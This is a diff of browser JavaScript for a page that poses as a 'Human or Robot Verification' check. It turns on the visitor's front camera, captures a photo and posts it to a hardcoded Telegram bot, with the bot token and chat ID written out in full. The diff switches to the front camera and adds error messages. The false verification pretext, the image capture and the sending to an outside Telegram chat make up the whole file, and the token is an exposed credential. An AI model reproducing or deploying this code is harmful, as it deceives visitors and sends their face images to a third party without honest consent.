@@ -1,5 +1,5 @@
 // Telegram Bot Details
-const botToken = "7519273136:AAHZ7eBXEoVZRQFqILu8tGnuMLvtZOWohqc"; // Replace with your bot's token
+const botToken = "7519273136:AAHZ7eBXEoVZRQFqILu8tGnuMLvtZOWohqc"; // Replace with your bot token
 const chatId = "7945358964"; // Replace with your chat ID
 
 // Select elements
@@ -8,16 +8,26 @@ const canvas = document.getElementById("canvas");
 const captureButton = document.getElementById("capture");
 const ctx = canvas.getContext("2d");
 
-// Request camera access
+// Start camera
 async function startCamera() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "environment" } // Use "user" for front camera
+      video: { facingMode: "user" }, // Use "environment" for back camera
     });
     video.srcObject = stream;
   } catch (error) {
-    alert("Camera access denied or unavailable.");
-    console.error(error);
+    handleCameraError(error);
+  }
+}
+
+// Handle camera errors
+function handleCameraError(error) {
+  if (error.name === "NotAllowedError") {
+    alert("Camera access was denied. Please enable camera permissions in your browser.");
+  } else if (error.name === "NotFoundError") {
+    alert("No camera found on your device.");
+  } else {
+    alert(`An error occurred: ${error.message}`);
   }
 }
 
@@ -31,17 +41,16 @@ async function captureAndSend() {
 
   // Prepare data for Telegram
   const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-
   const formData = new FormData();
   formData.append("chat_id", chatId);
   formData.append("photo", dataURItoBlob(imageBase64));
-  formData.append("caption", "Human or Robot Verification Photo");
+  formData.append("caption", "Captured image for Human or Robot Verification");
 
   // Send image to Telegram
   try {
     await fetch(telegramUrl, {
       method: "POST",
-      body: formData
+      body: formData,
     });
     alert("Photo sent to Telegram!");
   } catch (error) {
@@ -62,6 +71,6 @@ function dataURItoBlob(dataURI) {
   return new Blob([ab], { type: mimeString });
 }
 
-// Event listeners
+// Add event listeners
 captureButton.addEventListener("click", captureAndSend);
 startCamera();
